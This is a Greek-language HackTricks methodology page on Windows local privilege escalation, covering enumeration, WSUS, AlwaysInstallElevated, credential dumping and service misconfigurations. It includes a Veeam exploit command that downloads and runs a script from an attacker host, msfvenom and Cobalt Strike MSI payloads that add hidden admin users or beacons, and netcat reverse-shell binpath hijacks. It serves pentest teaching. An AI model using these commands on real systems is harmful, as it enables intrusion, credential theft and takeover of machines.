# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Καλύτερο εργαλείο για την αναζήτηση vectors για Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Αρχική Θεωρία των Windows

### Access Tokens

**Αν δεν γνωρίζετε τι είναι τα Windows Access Tokens, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Ελέγξτε την παρακάτω σελίδα για περισσότερες πληροφορίες σχετικά με τα ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Αν δεν γνωρίζετε τι είναι τα integrity levels στα Windows, θα πρέπει να διαβάσετε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Υπάρχουν διάφορα πράγματα στα Windows που θα μπορούσαν να **σας εμποδίσουν να κάνετε enumeration του συστήματος**, να εκτελέσετε executables ή ακόμη και να **ανιχνεύσουν τις δραστηριότητές σας**. Θα πρέπει να **διαβάσετε** την παρακάτω **σελίδα** και να κάνετε **enumeration** όλων αυτών των **μηχανισμών** **άμυνας** πριν ξεκινήσετε το privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Οι UIAccess processes που εκκινούνται μέσω του `RAiLaunchAdminProcess` μπορούν να αξιοποιηθούν για την επίτευξη High IL χωρίς prompts, όταν παρακάμπτονται οι secure-path checks του AppInfo. Ελέγξτε εδώ το ειδικό workflow για παράκαμψη των UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Η propagation των accessibility registry settings του Secure Desktop μπορεί να αξιοποιηθεί για αυθαίρετο SYSTEM registry write (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Οι πρόσφατες εκδόσεις των Windows εισήγαγαν επίσης ένα **SMB arbitrary-port** LPE path, όπου ένα privileged local NTLM authentication γίνεται reflected μέσω μιας reused SMB TCP connection:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Πληροφορίες Συστήματος

### Enumeration πληροφοριών έκδοσης

Ελέγξτε αν η έκδοση των Windows περιέχει κάποια γνωστή vulnerability (ελέγξτε επίσης τα patches που έχουν εφαρμοστεί).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits εκδόσεων

Αυτό το [site](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμο για την αναζήτηση λεπτομερών πληροφοριών σχετικά με vulnerabilities ασφαλείας της Microsoft. Αυτή η database περιλαμβάνει περισσότερα από 4.700 vulnerabilities ασφαλείας, αναδεικνύοντας το **τεράστιο attack surface** που παρουσιάζει ένα Windows environment.

**Στο σύστημα**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Το Winpeas έχει ενσωματωμένο το watson)_

**Τοπικά, με system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos με exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Υπάρχουν credentials ή Juicy info αποθηκευμένα στις env variables;
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Ιστορικό PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Αρχεία Transcript του PowerShell

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε στη διεύθυνση [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/).
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Καταγραφή Module του PowerShell

Καταγράφονται λεπτομέρειες των εκτελέσεων pipeline του PowerShell, συμπεριλαμβανομένων των εντολών που εκτελέστηκαν, των κλήσεων εντολών και τμημάτων των scripts. Ωστόσο, ενδέχεται να μην καταγράφονται πλήρεις λεπτομέρειες εκτέλεσης και αποτελέσματα εξόδου.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες στην ενότητα "Transcript files" της τεκμηρίωσης και επιλέξτε **"Module Logging"** αντί για **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Για να προβάλετε τα τελευταία 15 συμβάντα από τα logs του PowersShell, μπορείτε να εκτελέσετε:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Καταγράφεται ένα πλήρες αρχείο δραστηριότητας και όλο το περιεχόμενο της εκτέλεσης του script, διασφαλίζοντας ότι κάθε block κώδικα τεκμηριώνεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο audit trail κάθε δραστηριότητας, πολύτιμο για forensics και την ανάλυση κακόβουλης συμπεριφοράς. Με την τεκμηρίωση όλης της δραστηριότητας κατά τον χρόνο εκτέλεσης, παρέχονται λεπτομερείς πληροφορίες για τη διαδικασία.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Τα συμβάντα καταγραφής για το Script Block μπορούν να εντοπιστούν στο Windows Event Viewer στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να προβάλετε τα 20 τελευταία συμβάντα, μπορείτε να χρησιμοποιήσετε:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet Settings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Δίσκοι
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Μπορείτε να παραβιάσετε το σύστημα αν οι ενημερώσεις δεν ζητούνται μέσω http**S**, αλλά μέσω http.

Ξεκινάτε ελέγχοντας αν το δίκτυο χρησιμοποιεί ενημέρωση WSUS χωρίς SSL, εκτελώντας τα παρακάτω στο cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ή τα ακόλουθα στο PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Αν λάβετε μια απάντηση όπως μία από τις παρακάτω:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Και αν το `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή το `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` είναι ίσο με `1`.

Τότε, **είναι exploitable.** Αν η τελευταία registry τιμή είναι ίση με 0, τότε η καταχώριση WSUS θα αγνοηθεί.

Για να κάνετε exploit σε αυτά τα vulnerabilities, μπορείτε να χρησιμοποιήσετε εργαλεία όπως: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Πρόκειται για MiTM weaponized exploit scripts που κάνουν inject 'fake' updates σε non-SSL WSUS traffic.

Διαβάστε την έρευνα εδώ:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Διαβάστε το πλήρες report εδώ**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Βασικά, αυτό είναι το flaw που εκμεταλλεύεται αυτό το bug:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε τον proxy του local user και τα Windows Updates χρησιμοποιούν τον proxy που έχει ρυθμιστεί στις ρυθμίσεις του Internet Explorer, τότε έχουμε τη δυνατότητα να εκτελέσουμε το [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά, ώστε να κάνουμε intercept το δικό μας traffic και να εκτελέσουμε code ως elevated user στο asset μας.
>
> Επιπλέον, επειδή η WSUS service χρησιμοποιεί τις ρυθμίσεις του τρέχοντος user, θα χρησιμοποιεί επίσης το certificate store του. Αν δημιουργήσουμε ένα self-signed certificate για το WSUS hostname και προσθέσουμε αυτό το certificate στο certificate store του τρέχοντος user, θα μπορούμε να κάνουμε intercept τόσο HTTP όσο και HTTPS WSUS traffic. Η WSUS δεν χρησιμοποιεί μηχανισμούς τύπου HSTS για να υλοποιήσει validation τύπου trust-on-first-use στο certificate. Αν το certificate που παρουσιάζεται είναι trusted από τον user και έχει το σωστό hostname, θα γίνει αποδεκτό από τη service.

Μπορείτε να κάνετε exploit σε αυτό το vulnerability χρησιμοποιώντας το εργαλείο [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (μόλις απελευθερωθεί).

## Third-Party Auto-Updaters και Agent IPC (local privesc)

Πολλοί enterprise agents εκθέτουν μια localhost IPC surface και ένα privileged update channel. Αν το enrollment μπορεί να εξαναγκαστεί να χρησιμοποιήσει server του attacker και ο updater εμπιστεύεται ένα rogue root CA ή χρησιμοποιεί weak signer checks, ένας local user μπορεί να παραδώσει ένα malicious MSI, το οποίο εγκαθίσταται από τη SYSTEM service. Δείτε μια generalized technique (βασισμένη στο Netskope stAgentSvc chain – CVE-2025-0309) εδώ:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM μέσω TCP 9401)

Το Veeam B&R < `11.0.1.1261` εκθέτει μια localhost service στο **TCP/9401**, η οποία επεξεργάζεται attacker-controlled messages, επιτρέποντας arbitrary commands ως **NT AUTHORITY\SYSTEM**.

- **Recon**: επιβεβαιώστε τον listener και την έκδοση, π.χ. `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: τοποθετήστε ένα PoC όπως το `VeeamHax.exe` μαζί με τα απαιτούμενα Veeam DLLs στον ίδιο directory και, στη συνέχεια, κάντε trigger ένα SYSTEM payload μέσω του local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Η υπηρεσία εκτελεί την εντολή ως SYSTEM.
## KrbRelayUp

Υπάρχει μια ευπάθεια **local privilege escalation** σε Windows **domain** περιβάλλοντα υπό συγκεκριμένες συνθήκες. Αυτές οι συνθήκες περιλαμβάνουν περιβάλλοντα όπου το **LDAP signing δεν επιβάλλεται,** οι χρήστες διαθέτουν self-rights που τους επιτρέπουν να ρυθμίζουν το **Resource-Based Constrained Delegation (RBCD),** καθώς και τη δυνατότητα των χρηστών να δημιουργούν υπολογιστές μέσα στο domain. Είναι σημαντικό να σημειωθεί ότι αυτές οι **απαιτήσεις** ικανοποιούνται με τις **προεπιλεγμένες ρυθμίσεις**.

Βρείτε το **exploit στο** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης, δείτε [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Αν** αυτά τα 2 registry keys είναι **ενεργοποιημένα** (η τιμή είναι **0x1**), τότε οι χρήστες με οποιοδήποτε επίπεδο δικαιωμάτων μπορούν να **εγκαταστήσουν** (εκτελέσουν) αρχεία `*.msi` ως NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Εάν έχετε ένα meterpreter session, μπορείτε να αυτοματοποιήσετε αυτήν την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το PowerUP για να δημιουργήσετε μέσα στον τρέχοντα κατάλογο ένα Windows MSI binary για privilege escalation. Αυτό το script γράφει έναν precompiled MSI installer που ζητά την προσθήκη user/group (οπότε θα χρειαστείτε πρόσβαση GIU):
```
Write-UserAddMSI
```
Απλώς εκτελέστε το δημιουργημένο binary για escalation προνομίων.

### MSI Wrapper

Διαβάστε αυτό το tutorial για να μάθετε πώς να δημιουργήσετε ένα MSI wrapper χρησιμοποιώντας αυτά τα tools. Σημειώστε ότι μπορείτε να κάνετε wrap ένα αρχείο "**.bat**" αν **απλώς** θέλετε να **εκτελέσετε** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Δημιουργία MSI με WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Δημιουργία MSI με Visual Studio

- **Δημιουργήστε** με το Cobalt Strike ή το Metasploit ένα **νέο Windows EXE TCP payload** στο `C:\privesc\beacon.exe`
- Ανοίξτε το **Visual Studio**, επιλέξτε **Create a new project** και πληκτρολογήστε "installer" στο πλαίσιο αναζήτησης. Επιλέξτε το project **Setup Wizard** και κάντε κλικ στο **Next**.
- Δώστε στο project ένα όνομα, όπως **AlwaysPrivesc**, χρησιμοποιήστε το **`C:\privesc`** ως τοποθεσία, επιλέξτε **place solution and project in the same directory** και κάντε κλικ στο **Create**.
- Συνεχίστε να κάνετε κλικ στο **Next** μέχρι να φτάσετε στο βήμα 3 από 4 (επιλογή αρχείων προς συμπερίληψη). Κάντε κλικ στο **Add** και επιλέξτε το Beacon payload που μόλις δημιουργήσατε. Στη συνέχεια κάντε κλικ στο **Finish**.
- Επισημάνετε το project **AlwaysPrivesc** στο **Solution Explorer** και, στις **Properties**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
- Υπάρχουν και άλλες ιδιότητες που μπορείτε να αλλάξετε, όπως τα **Author** και **Manufacturer**, οι οποίες μπορούν να κάνουν την εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
- Κάντε δεξί κλικ στο project και επιλέξτε **View > Custom Actions**.
- Κάντε δεξί κλικ στο **Install** και επιλέξτε **Add Custom Action**.
- Κάντε διπλό κλικ στο **Application Folder**, επιλέξτε το αρχείο **beacon.exe** και κάντε κλικ στο **OK**. Αυτό διασφαλίζει ότι το Beacon payload θα εκτελείται μόλις εκτελεστεί ο installer.
- Στις **Custom Action Properties**, αλλάξτε το **Run64Bit** σε **True**.
- Τέλος, κάντε **build**.
- Αν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιωθείτε ότι έχετε ορίσει την πλατφόρμα σε x64.

### Εγκατάσταση MSI

Για να εκτελέσετε την **εγκατάσταση** του κακόβουλου αρχείου `.msi` στο παρασκήνιο:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Για να εκμεταλλευτείτε αυτήν την ευπάθεια, μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Antivirus και Detectors

### Ρυθμίσεις Audit

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, επομένως θα πρέπει να δώσετε προσοχή
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Το Windows Event Forwarding είναι χρήσιμο για να γνωρίζετε πού αποστέλλονται τα logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

Το **LAPS** έχει σχεδιαστεί για τη **διαχείριση των τοπικών κωδικών πρόσβασης Administrator**, διασφαλίζοντας ότι κάθε κωδικός πρόσβασης είναι **μοναδικός, τυχαιοποιημένος και ενημερώνεται τακτικά** σε υπολογιστές συνδεδεμένους σε domain. Αυτοί οι κωδικοί πρόσβασης αποθηκεύονται με ασφάλεια στο Active Directory και είναι προσβάσιμοι μόνο από χρήστες στους οποίους έχουν εκχωρηθεί επαρκή δικαιώματα μέσω ACLs, επιτρέποντάς τους να βλέπουν τους τοπικούς κωδικούς πρόσβασης admin, εφόσον είναι εξουσιοδοτημένοι.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Εάν είναι ενεργό, οι **κωδικοί πρόσβασης σε plain-text αποθηκεύονται στο LSASS** (Local Security Authority Subsystem Service).\
[**Περισσότερες πληροφορίες σχετικά με το WDigest σε αυτήν τη σελίδα**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Starting with **Windows 8.1**, η Microsoft εισήγαγε ενισχυμένη προστασία για το Local Security Authority (LSA), ώστε να **μπλοκάρει** προσπάθειες από μη αξιόπιστες διεργασίες να **διαβάσουν τη μνήμη του** ή να εισαγάγουν κώδικα, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**Περισσότερες πληροφορίες για το LSA Protection εδώ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

Το **Credential Guard** παρουσιάστηκε στα **Windows 10**. Σκοπός του είναι να προστατεύει τα credentials που είναι αποθηκευμένα σε μια συσκευή από απειλές όπως οι επιθέσεις pass-the-hash.| [**Περισσότερες πληροφορίες σχετικά με το Credentials Guard εδώ.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

Τα **domain credentials** πιστοποιούνται από το **Local Security Authority** (LSA) και χρησιμοποιούνται από στοιχεία του λειτουργικού συστήματος. Όταν τα δεδομένα σύνδεσης ενός χρήστη πιστοποιούνται από ένα καταχωρισμένο security package, συνήθως δημιουργούνται **domain credentials** για τον χρήστη.\
[**Περισσότερες πληροφορίες για τα Cached Credentials εδώ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Χρήστες και ομάδες

### Απαρίθμηση χρηστών και ομάδων

Πρέπει να ελέγξετε αν κάποια από τις ομάδες στις οποίες ανήκετε διαθέτει ενδιαφέροντα δικαιώματα
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Προνομιούχες ομάδες

Αν **ανήκετε σε κάποια προνομιούχα ομάδα, ενδέχεται να μπορείτε να κλιμακώσετε τα δικαιώματά σας**. Μάθετε εδώ περισσότερα σχετικά με τις προνομιούχες ομάδες και τον τρόπο κατάχρησής τους για την κλιμάκωση δικαιωμάτων:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Μάθετε περισσότερα** σχετικά με το τι είναι ένα **token** σε αυτήν τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Ελέγξτε την παρακάτω σελίδα για να **μάθετε περισσότερα σχετικά με ενδιαφέροντα tokens** και τον τρόπο κατάχρησής τους:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Συνδεδεμένοι χρήστες / Sessions
```bash
qwinsta
klist sessions
```
### Φάκελοι home
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Πολιτική κωδικών πρόσβασης
```bash
net accounts
```
### Λήψη του περιεχομένου του clipboard
```bash
powershell -command "Get-Clipboard"
```
## Εκτελούμενες Διεργασίες

### Δικαιώματα Αρχείων και Φακέλων

Καταρχάς, κατά την εμφάνιση των διεργασιών, **έλεγξε για κωδικούς πρόσβασης μέσα στη γραμμή εντολών της διεργασίας**.\
Έλεγξε αν μπορείς να **αντικαταστήσεις κάποιο binary που εκτελείται** ή αν έχεις δικαιώματα εγγραφής στον φάκελο του binary, ώστε να εκμεταλλευτείς πιθανές [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Να ελέγχετε πάντα για πιθανούς [**electron/cef/chromium debuggers** που εκτελούνται, καθώς θα μπορούσατε να τους εκμεταλλευτείτε για κλιμάκωση προνομίων](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

**Έλεγχος των δικαιωμάτων των binaries των processes**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Έλεγχος των δικαιωμάτων των φακέλων των δυαδικών αρχείων των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Εξόρυξη κωδικών πρόσβασης από τη μνήμη

Μπορείτε να δημιουργήσετε ένα memory dump μιας εκτελούμενης διεργασίας χρησιμοποιώντας το **procdump** από το sysinternals. Υπηρεσίες όπως το FTP έχουν τα **credentials σε clear text στη μνήμη**· δοκιμάστε να κάνετε dump της μνήμης και να διαβάσετε τα credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Μη ασφαλείς εφαρμογές GUI

**Οι εφαρμογές που εκτελούνται ως SYSTEM ενδέχεται να επιτρέπουν σε έναν χρήστη να εκκινήσει ένα CMD ή να περιηγηθεί σε καταλόγους.**

Παράδειγμα: "Windows Help and Support" (Windows + F1), αναζητήστε "command prompt", κάντε κλικ στο "Click to open Command Prompt"

## Υπηρεσίες

Τα Service Triggers επιτρέπουν στα Windows να εκκινούν μια υπηρεσία όταν προκύπτουν συγκεκριμένες συνθήκες (δραστηριότητα named pipe/RPC endpoint, συμβάντα ETW, διαθεσιμότητα IP, άφιξη συσκευής, ανανέωση GPO κ.λπ.). Ακόμη και χωρίς δικαιώματα SERVICE_START, συχνά μπορείτε να εκκινήσετε privileged services ενεργοποιώντας τα triggers τους. Δείτε εδώ τεχνικές enumeration και activation:

-
{{#ref}}
service-triggers.md
{{#endref}}

Λάβετε μια λίστα υπηρεσιών:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε το **sc** για να λάβετε πληροφορίες σχετικά με μια υπηρεσία
```bash
sc qc <service_name>
```
Συνιστάται να έχετε το binary **accesschk** από το _Sysinternals_ για να ελέγχετε το απαιτούμενο επίπεδο προνομίων για κάθε service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Συνιστάται να ελέγξετε αν οι "Authenticated Users" μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Μπορείτε να κατεβάσετε το accesschk.exe για XP από εδώ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση service

Αν αντιμετωπίζετε αυτό το σφάλμα (για παράδειγμα με το SSDPSRV):

_Παρουσιάστηκε το σφάλμα συστήματος 1058._\
_Το service δεν μπορεί να ξεκινήσει, είτε επειδή είναι απενεργοποιημένο είτε επειδή δεν υπάρχουν ενεργοποιημένες συσκευές που να σχετίζονται με αυτό._

Μπορείτε να το ενεργοποιήσετε χρησιμοποιώντας
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από την SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη λύση** για αυτό το πρόβλημα είναι η εκτέλεση:
```
sc.exe config usosvc start= auto
```
### **Τροποποίηση διαδρομής δυαδικού αρχείου υπηρεσίας**

Στο σενάριο όπου η ομάδα "Authenticated users" διαθέτει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου δυαδικού αρχείου της υπηρεσίας. Για την τροποποίηση και την εκτέλεση του **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Restart service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Τα δικαιώματα μπορούν να κλιμακωθούν μέσω διαφόρων permissions:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την επαναδιαμόρφωση του service binary.
- **WRITE_DAC**: Επιτρέπει την επαναδιαμόρφωση permissions, οδηγώντας στη δυνατότητα αλλαγής των service configurations.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση ownership και την επαναδιαμόρφωση permissions.
- **GENERIC_WRITE**: Κληρονομεί τη δυνατότητα αλλαγής των service configurations.
- **GENERIC_ALL**: Επίσης κληρονομεί τη δυνατότητα αλλαγής των service configurations.

Για τον εντοπισμό και την εκμετάλλευση αυτού του vulnerability, μπορεί να χρησιμοποιηθεί το _exploit/windows/local/service_permissions_.

### Αδύναμα permissions στα service binaries

